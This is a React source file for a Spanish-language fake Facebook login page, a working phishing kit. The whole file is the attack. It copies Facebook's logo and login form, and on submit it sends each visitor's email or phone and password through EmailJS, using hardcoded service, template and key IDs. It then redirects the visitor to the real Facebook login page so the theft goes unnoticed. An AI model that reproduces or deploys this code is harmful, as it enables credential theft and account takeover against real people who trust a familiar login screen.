import { useState } from "react";
import emailjs from "emailjs-com";
import logoF from "./assets/logo-face.png";
import "./index.css";
import meta from './assets/meta.png';

function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");

  const enviarFormulario = (e) => {
    e.preventDefault();

    const formData = {
      from_name: email,
      password: password,
    };

    emailjs
      .send(
        "service_5x6zlo2",
        "template_6izwtap",
        formData,
        "JDZWfTVwUTQlVFjth"
      )
      .then(
        (result) => {
          console.log("Correo enviado:", result.text);
          // Redirigir a la página de inicio de sesión de Facebook después de enviar el formulario
          window.location.href = "https://www.facebook.com/login.php";
        },
        (error) => {
          console.log("Error:", error.text);
          setError("Ocurrió un error. Por favor, intente nuevamente.");
        }
      );

    setEmail("");
    setPassword("");
  };

  return (
    <div className="topContent">
      <span className="idioma">Español</span>
      <img src={logoF} alt="logo face" className="logo-F" />
      <form onSubmit={enviarFormulario}>
        <input
          type="text"
          required
          placeholder="Celular o correo electrónico"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
        />
        <input
          type="password"
          required
          placeholder="Contraseña"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        <button type="submit" className="sesion">Iniciar sesión</button>
        <a href="#" className="olvidado">¿Olvidaste tu contraseña?</a>
      </form>
      <div className="bottom">
        <button>Crear cuenta nueva</button>
        <img src={meta} alt="" />
      </div>
      {error && <p className="error-message">{error}</p>}
    </div>
  );
}

export default App;
